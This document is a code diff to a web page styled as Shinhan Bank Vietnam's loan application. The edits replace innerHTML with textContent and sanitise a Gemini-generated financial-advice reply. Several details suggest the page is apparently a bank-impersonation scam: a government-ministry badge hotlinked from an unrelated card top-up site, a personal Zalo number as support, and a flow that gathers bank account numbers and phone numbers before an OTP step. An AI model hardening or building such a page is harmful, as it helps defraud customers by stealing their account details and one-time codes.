@@ -181,7 +181,7 @@
                 <img src="https://simg.zalopay.com.vn/zst/zlp-website/resources/images/footer/BCTLogo_1.png" alt="Bộ Công Thương" class="h-10">
                 <img src="https://napthengay.vn/logoSaleNoti.png" alt="Bộ Công Thương" class="h-10">
             </div>
-            <p>Liên hệ: <a href="mailto:support@shinhanbank.vn" class="hover:underline">support@shinhanbank.vn</a> | Hotline: 1900-1234 | <a href="http://zalo.me/84762797077" class="hover:underline">Hỗ trợ Zalo</a></p>
+            <p>Liên hệ: <a href="mailto:support@shinhanbank.vn" class="hover:underline">support@shinhanbank.vn</a> | Hotline: 1900-1234 | <a href="https://zalo.me/84762797077" class="hover:underline" rel="noopener noreferrer">Hỗ trợ Zalo</a></p>
             <p class="mt-1">Dữ liệu được mã hóa với SSL. Kết nối an toàn.</p>
             <p class="mt-4">© 2025 Shinhan Bank Việt Nam. All Rights Reserved.</p>
             <p>Địa chỉ: Tầng 12, Tòa nhà Vincom Center, 72 Lê Thánh Tôn, Quận 1, TP. Hồ Chí Minh</p>
@@ -331,13 +331,13 @@
             const modalContent = document.getElementById('gemini-modal-content');
             
             if (!formData || !formData.amount) {
-                modalContent.innerHTML = `<p class="text-red-500">Không tìm thấy thông tin khoản vay để đưa ra lời khuyên.</p>`;
+                modalContent.textContent = "Không tìm thấy thông tin khoản vay để đưa ra lời khuyên.";
                 modal.classList.remove('hidden');
                 return;
             }
             
             modal.classList.remove('hidden');
-            modalContent.innerHTML = `<div class="loader"></div>`;
+            modalContent.innerHTML = `<div class="loader" aria-label="Đang tải"></div>`;
 
             const prompt = `Tôi sắp vay một khoản tiền là ${formData.amount} VND với thời hạn ${formData.months || 'không xác định'} tháng từ ngân hàng Shinhan. Dựa trên thông tin này, hãy đưa ra một số lời khuyên tài chính ngắn gọn, dễ hiểu và hữu ích cho người dùng ở Việt Nam. Vui lòng tập trung vào các điểm chính sau:
 1. Gợi ý cách lập ngân sách hàng tháng để đảm bảo trả nợ đúng hạn.
@@ -366,14 +366,23 @@ Hãy trình bày dưới dạng danh sách các gạch đầu dòng, sử dụng
                 if (result.candidates && result.candidates.length > 0 &&
                     result.candidates[0].content && result.candidates[0].content.parts &&
                     result.candidates[0].content.parts.length > 0) {
-                    const text = result.candidates[0].content.parts[0].text.replace(/(\* |- )/g, '• ').replace(/\n/g, '<br>');
-                    modalContent.innerHTML = `<div class="text-left text-sm text-slate-700 space-y-3 prose prose-sm max-w-none">${text}</div>`;
+                    const raw = result.candidates[0].content.parts[0].text || '';
+                    const safe = raw
+                        .split('\n')
+                        .map(line => line.replace(/^(\*|-)\s*/, '• ').trim())
+                        .filter(Boolean)
+                        .join('\n');
+                    const container = document.createElement('div');
+                    container.className = 'text-left text-sm text-slate-700 space-y-3 prose prose-sm max-w-none';
+                    container.textContent = safe;
+                    modalContent.innerHTML = '';
+                    modalContent.appendChild(container);
                 } else {
                     throw new Error("Không nhận được phản hồi hợp lệ từ AI.");
                 }
             } catch (error) {
                 console.error("Gemini API Error:", error);
-                modalContent.innerHTML = `<p class="text-red-500">Rất tiếc, đã có lỗi xảy ra khi tạo lời khuyên. Vui lòng thử lại sau.</p>`;
+                modalContent.textContent = "Rất tiếc, đã có lỗi xảy ra khi tạo lời khuyên. Vui lòng thử lại sau.";
             }
         }
         
@@ -402,7 +411,8 @@ Hãy trình bày dưới dạng danh sách các gạch đầu dòng, sử dụng
                 document.getElementById('summaryAmount').textContent = formData.amount || 'N/A';
                 document.getElementById('summaryBank').textContent = formData.bank || 'N/A';
                 document.getElementById('summaryAccountNumber').textContent = formData.accountNumber || 'N/A';
-                document.getElementById('otpMessage').innerHTML = `Một mã OTP đã được gửi đến số điện thoại <strong>${formData.phone || 'N/A'}</strong>.`;
+                const phone = formData.phone || 'N/A';
+                document.getElementById('otpMessage').textContent = `Một mã OTP đã được gửi đến số điện thoại ${phone}.`;
             } catch (error) {
                 console.error('Error parsing formData:', error);
                 window.location.href = '/shinhanbank/pages/vi/Evaluate-conditions.html';
